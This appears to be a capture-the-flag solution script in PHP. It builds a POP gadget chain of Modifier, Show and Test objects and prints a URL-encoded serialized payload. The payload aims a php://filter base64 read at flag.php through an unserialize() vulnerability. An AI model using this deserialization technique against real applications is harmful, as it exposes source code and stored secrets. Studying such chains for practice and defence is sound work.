Welcome to index.
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var="php://filter/read=convert.base64-encode/resource=flag.php";
}

class Show{
    public $source;
    public $str;
    public function __construct($file){
        $this->source = $file;
    }
    public function __toString(){
        return $this->str->source;
    }

}

class Test{
    public $p;
}

$a= new Show("aaa");
$a->str=new Test();
$a->str->p = new Modifier();
$b = new Show($a);
echo urlencode(serialize($b));